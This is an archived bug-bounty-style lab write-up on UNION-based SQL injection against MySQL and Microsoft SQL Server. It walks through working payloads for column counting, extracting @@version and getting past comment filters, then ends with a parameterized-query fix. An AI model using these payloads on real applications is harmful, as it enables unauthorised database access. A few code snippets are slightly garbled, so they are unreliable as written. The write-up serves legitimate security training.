# SQL Injection UNION Attack — MySQL/Microsoft Version

- **Source URL:** https://medium.com/@cipher0x00/sql-injection-union-attack-mysql-microsoft-version-b725dd640d18?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126143604/https://medium.com/@cipher0x00/sql-injection-union-attack-mysql-microsoft-version-b725dd640d18
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/11228 (id 11228)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# SQL Injection UNION Attack — MySQL/Microsoft Version

## Lab Objective

Use UNION-based SQL injection to retrieve and display MySQL or Microsoft SQL Server database version.

## The Vulnerability: UNION SQLi (Non-Oracle)

**Key Difference from Oracle:** MySQL and Microsoft SQL Server do NOT require a `FROM` clause in SELECT statements. This makes UNION attacks simpler.

```
-- ✅ Works in MySQL/MSSQL (no FROM needed)
' UNION SELECT 'abc','def'#
```
```
-- ❌ Fails in Oracle (needs FROM dual)
' UNION SELECT 'abc','def'--
```
**Attack Goal:** Extract database version using `@@version` (MySQL/MSSQL syntax).

## Comment Character Differences

## Critical: Not All Databases Accept `--`

**Oracle/PostgreSQL:**

```
-- Comment syntax
' OR 1=1--
```
**MySQL:**

```
# Hash comment (preferred)
' OR 1=1#
```
```
-- Double dash (requires space after)
' OR 1=1-- 
           ↑
    Space required!
```
**Microsoft SQL Server:**

```
-- Double dash works
' OR 1=1--
```
```
/* Block comment also works */
' OR 1=1/*
```
**Why This Lab Uses #:** The application rejects `--` characters, likely due to:

- WAF (Web Application Firewall) filtering
- Input sanitization attempting to block SQLi
- URL encoding issues with trailing spaces

**Solution:** Use `#` for MySQL (cleaner, no space needed).

## Recon Phase

## Step 1: Confirm SQL Injection

- **Action:** Inject single quote: `?category='`
- **Result:** Internal Server Error
- **Why:** Breaks SQL syntax → vulnerable

## Step 2: Determine Column Count

### Attempt 1: Using `--` Comment

`' ORDER BY 1--`
**Result:** ❌ Internal Server Error

**Why It Failed:**

- Application blocks `--` characters
- Could be WAF, input filter, or URL parsing issue
- Need alternative comment syntax

### Attempt 2: Using `#` Comment

```
' ORDER BY 1#    → ✅ 200 OK (column 1 exists)
' ORDER BY 2#    → ✅ 200 OK (column 2 exists)
' ORDER BY 3#    → ❌ 500 Error (column 3 doesn't exist)
```
**Conclusion:** Query returns **2 columns**

**Mathematical Deduction:**

```
If ORDER BY 2 works but ORDER BY 3 fails:
Column count = 3 - 1 = 2 columns
```
## Step 3: Identify Column Data Types

**Observation from Browser:**

- First column: Product name (text)
- Second column: Product description (text)
- Both likely accept strings

**Test Payload:**

`' UNION SELECT 'a','a'#`
**Result:** ✅ 200 OK, both ‘a’ values display on page

**Conclusion:** Both columns accept TEXT data.

**Why We Skip Iterative Testing:** Since we can see text in both columns on the page, we know they accept strings. In real engagements, test each column individually:

```
' UNION SELECT 'a',NULL#    -- Test column 1
' UNION SELECT NULL,'a'#    -- Test column 2
```
## Database Fingerprinting

## How to Identify the Database

**Test 1: Does it need FROM clause?**

`' UNION SELECT 'test','test'#`
- ✅ Works → MySQL/MSSQL/PostgreSQL
- ❌ Fails → Oracle (needs FROM dual)

**Test 2: Comment syntax**

```
' OR 1=1#     → Works = MySQL
' OR 1=1--    → Works = MSSQL/PostgreSQL/Oracle
```
**Test 3: Version syntax**

```
@@version       → MySQL/MSSQL
version()       → MySQL/PostgreSQL
BANNER          → Oracle
```
## Exploitation

## Final Payload: `' UNION SELECT @@version, NULL#`

Let’s break it down:

## Payload Component Breakdown

### 1. Close the String: `'`

```
SELECT name, description FROM products WHERE category = ''
                                                        ↑
                                            Closes the string
```
### 2. UNION Statement: `UNION SELECT`

```
SELECT name, description FROM products WHERE category = ''
UNION SELECT @@version, NULL
```
Combines original query with our injected query.

### 3. Version Command: `@@version`

**What is @@version?**

- Global variable in MySQL and Microsoft SQL Server
- Contains complete version information
- Accessible without special privileges

**MySQL Output Example:**

`8.0.23-0ubuntu0.20.04.1`
**Microsoft SQL Server Output Example:**

`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)`
**Why @@version and not something else?**

- Universal across MySQL/MSSQL
- No table access needed
- Single function call returns full version

### 4. Second Column: `NULL`

```
UNION SELECT @@version, NULL
                       ↑
             Fills second column requirement
```
**Why NULL?**

- Original query has 2 columns
- We only need 1st column for version
- NULL is compatible with any data type
- Cleaner than dummy string

### 5. Comment Character: `#`

```
... @@version, NULL#' AND released = 1
                    ^^^^^^^^^^^^^^^^^^^
                    Everything ignored
```
**Why # instead of --?**

- Application blocks `--` (likely security filter)
- `#` is MySQL-specific comment
- No trailing space required
- Cleaner URL encoding

## Why This Payload Works

## The Complete Injection Flow

**Original Query:**

```
SELECT name, description 
FROM products 
WHERE category = 'USER_INPUT' 
AND released = 1
```
**After Injection:**

```
SELECT name, description 
FROM products 
WHERE category = '' 
UNION SELECT @@version, NULL#' 
AND released = 1
```
**What Actually Executes:**

```
SELECT name, description 
FROM products 
WHERE category = ''
UNION 
SELECT @@version, NULL
```
**Result:**

1. First query: Returns products with empty category (none)
2. Second query: Returns database version in first column, NULL in second
3. Version string displays on page: `8.0.23` (MySQL)

## Step-by-Step Execution

## Using Burp Suite

### Step 1: Intercept Request

`GET /filter?category=Accessories HTTP/1.1`
### Step 2: Send to Repeater

- Allows multiple testing attempts
- Ctrl+U to URL encode

### Step 3: Test Column Count (Finding the Right Comment)

```
Attempt 1: ' ORDER BY 1--
Result: ❌ 500 Error (application blocks --)
```
Attempt 2: ' ORDER BY 1#

Result: ✅ 200 OK (# works!)Continue: ' ORDER BY 2# → ✅ 200 OK

Continue: ' ORDER BY 3# → ❌ 500 ErrorConclusion: 2 columns

### Step 4: Test Data Types

```
Payload: ' UNION SELECT 'a','a'#
Encode: Ctrl+U → '+UNION+SELECT+'a','a'#
Result: ✅ 200 OK, both 'a' values display
```
`Conclusion: Both columns accept TEXT`
### Step 5: Extract Version

```
Payload: ' UNION SELECT @@version, NULL#
Encode: '+UNION+SELECT+@@version,+NULL#
Result: ✅ Database version displays on page
```
## Comment Syntax: Deep Dive

## Why Comment Syntax Matters

**The Problem:** Different databases use different comment styles, and applications may filter certain characters.

## MySQL Comment Options

**1. Hash Comment # (Recommended)**

`' OR 1=1#`
- ✅ No space required
- ✅ URL-friendly
- ✅ MySQL-specific (confirms database type)
- ❌ Doesn’t work on MSSQL/Oracle/PostgreSQL

**2. Double Dash -- (Requires Space)**

```
' OR 1=1-- 
          ↑
    Space is CRITICAL
```
- ✅ Works on most databases
- ❌ **Space must be preserved** (URL encoding can break this)
- ❌ Often filtered by WAFs

**3. Inline Comment /\*\*/**

`' OR 1=1/**/`
- ✅ Works on most databases
- ✅ No space needed
- ❌ More verbose

## URL Encoding Issues with `--`

**The Space Problem:**

```
-- In SQL: needs trailing space
' OR 1=1-- 
```
-- In URL: space gets lost

?category=' OR 1=1---- Correct URL encoding:

?category=' OR 1=1--%20

↑↑

%20 = space

**Why # is Better for URLs:**

```
?category=' OR 1=1#
                  ↑
            No space needed, always works
```
## Common Mistakes & Fixes

## ❌ Mistake 1: Using `--` Without Space

`' UNION SELECT @@version, NULL--`
**Error:** May not work (comment not recognized)

**Fix:** Add space: `' UNION SELECT @@version, NULL--` OR use `#`

## ❌ Mistake 2: Forgetting Column Count

`' UNION SELECT @@version#`
**Error:** Column count mismatch (1 vs 2)

**Fix:** Add NULL: `' UNION SELECT @@version, NULL#`

## ❌ Mistake 3: Oracle Syntax on MySQL

`' UNION SELECT BANNER, NULL FROM v$version--`
**Error:** Table doesn’t exist

**Fix:** Use MySQL syntax: `' UNION SELECT @@version, NULL#`

## ❌ Mistake 4: Wrong Comment Character for Database

```
# on Oracle  → ❌ Fails (Oracle doesn't recognize #)
-- on MySQL  → ⚠️ Works but needs space
# on MySQL   → ✅ Best choice
```
## Database Version Commands: Quick Reference

Database Version Command Example Output MySQL `@@version` or `version()` `8.0.23-ubuntu` MSSQL `@@version` `Microsoft SQL Server 2019...` PostgreSQL `version()` `PostgreSQL 13.2...` Oracle `SELECT BANNER FROM v$version` `Oracle Database 11g...`

## Key Takeaways

1. **Comment Syntax Matters:** `#` for MySQL, `--` (with space) for others
2. **No FROM Needed:** MySQL/MSSQL don’t require `FROM dual`
3. **@@version is Universal:** Works on both MySQL and MSSQL
4. **WAF Evasion:** If `--` fails, try `#` or `/**/`
5. **Always Match Columns:** Use NULL for unwanted columns

## The Core Process

```
1. Confirm SQLi (single quote test)
2. Find column count (ORDER BY with correct comment)
3. Test data types (UNION SELECT strings)
4. Extract version (@@version for MySQL/MSSQL)
5. Use # comment (cleaner for URLs)
```
## Comparison: Oracle vs MySQL/MSSQL

Feature Oracle MySQL/MSSQL FROM clause Required (`FROM dual`) Optional Version command `BANNER FROM v$version` `@@version` Comment syntax `--` (with space) `#` or `--` Complexity Higher Lower

**Why MySQL/MSSQL is Easier:**

- No dummy table needed
- Simpler version extraction
- Flexible comment options

## Defense (Know Thy Enemy)

**Why This Attack Works:**

- String concatenation in SQL queries
- No prepared statements
- Comment characters not filtered consistently

**Proper Fix:**

```
# ❌ Vulnerable
query = f"SELECT name, desc FROM products WHERE category='{user_input}'"
```
```
# ✅ Safe (Parameterized Query)
query = "SELECT name, desc FROM products WHERE category=?"
cursor.execute(query, (category,))
```
**WAF Bypass Note:** If application blocks `--`, attackers will try:

- `#` (MySQL)
- `/**/` (most databases)
- URL encoding variations
- Always use parameterized queries as defense

## Quick Reference Card

**MySQL/MSSQL UNION SQLi Checklist:**

1. ✅ Test comment syntax: `#` or `--` (with space)
2. ✅ Find column count: `' ORDER BY n#`
3. ✅ Test data types: `' UNION SELECT 'a','b'#`
4. ✅ Extract version: `' UNION SELECT @@version,NULL#`

**Key Differences from Oracle:**

- ❌ No `FROM dual` needed
- ✅ Use `@@version` instead of `BANNER`
- ✅ `#` comment works (MySQL only)

**Remember:**

- `#` = MySQL comment (no space needed)
- `--` = Universal but needs trailing space
- `@@version` = MySQL/MSSQL version variable
